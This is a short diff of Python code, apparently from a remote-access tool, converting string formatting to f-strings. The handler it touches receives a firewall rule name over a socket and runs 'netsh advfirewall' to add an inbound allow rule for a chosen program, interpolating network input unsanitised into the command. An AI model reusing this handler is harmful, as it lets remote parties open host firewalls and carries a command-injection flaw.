@@ -13,13 +13,14 @@ rule = receive(client_socket)
 if allow.endswith(tuple(ext)):
     if os.path.exists(allow):
         path = os.path.abspath(allow)
-        cmd = 'netsh advfirewall firewall add rule name="{}" dir=in action=allow program="{}" enable=yes'.format(rule,path)
+        cmd = f'netsh advfirewall firewall add rule name="{rule}" dir=in action=allow program="{path}" enable=yes'
+
         resp = run_command(cmd)
         if "Ok." in resp:
             resp = "[+] Command successfully executed\n"
     else:
-        resp = '[!] Path to "{}" could not be found\n'.format(allow)
+        resp = f'[!] Path to "{allow}" could not be found\n'
 else:
-    resp = '[!] "{}" is not a valid program\n'.format(allow)
+    resp = f'[!] "{allow}" is not a valid program\n'
 
 send(client_socket,resp)
